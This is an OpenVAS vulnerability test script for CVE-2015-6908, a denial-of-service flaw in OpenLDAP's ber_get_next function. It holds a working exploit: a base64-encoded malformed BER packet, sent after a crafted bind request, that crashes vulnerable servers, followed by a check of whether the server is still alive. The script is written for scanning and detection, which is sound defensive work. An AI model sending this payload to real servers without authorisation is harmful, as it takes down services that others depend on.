##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openldap_ber_get_next_dos_vuln.nasl 14175 2019-03-14 11:27:57Z cfischer $
#
# OpenLDAP 'ber_get_next' Denial of Service Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809787");
  script_version("$Revision: 14175 $");
  script_cve_id("CVE-2015-6908");
  script_bugtraq_id(76714);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-14 12:27:57 +0100 (Thu, 14 Mar 2019) $");
  script_tag(name:"creation_date", value:"2017-01-25 16:44:08 +0530 (Wed, 25 Jan 2017)");
  script_name("OpenLDAP ber_get_next Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("ldap_detect.nasl");
  script_require_ports("Services/ldap", 389, 636);
  script_mandatory_keys("ldap/detected");

  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1033534");
  script_xref(name:"URL", value:"http://www.openldap.org/software/release/changes.html");
  script_xref(name:"URL", value:"http://www.security-assessment.com/files/documents/advisory/OpenLDAP-ber_get_next-Denial-of-Service.pdf");

  script_tag(name:"summary", value:"The host is running OpenLDAP and is
  prone to denial of service vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request and check
  whether it is able to crash the server or not.");

  script_tag(name:"insight", value:"The flaw is due to an 'assert' function
  call within the ber_get_next method (io.c line 682) that is hit when decoding
  tampered BER data.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"OpenLDAP versions 2.4.42 and prior.");

  script_tag(name:"solution", value:"Upgrade to OpenLDAP version 2.4.43 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("ldap.inc");
include("ssh_func.inc"); # for base64decode

port = get_ldap_port( default:389 );
if( ! ldap_alive( port:port ) ) exit( 0 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

req = raw_string( 0x30, 0x0c, 0x02, 0x01, 0x01, 0x60,
                  0x07, 0x02, 0x01, 0x03, 0x04, 0x00,
                  0x80, 0x00 );

send( socket:soc, data:req );
buf = recv( socket:soc, length:1 );

if( buf == NULL ) exit( 0 );
ldapres = hexstr( buf );

if( ldapres =~ "^30$" ) {

  exploit = base64decode( str:"/4SEhISEd4MKYj5ZMgAAAC8=" );
  send( socket:soc, data:exploit );

  sleep( 5 );

  if( ! ldap_alive( port:port ) ) {
    security_message( port:port );
    close( soc );
    exit( 0 );
  }
}

close( soc );
exit( 99 );
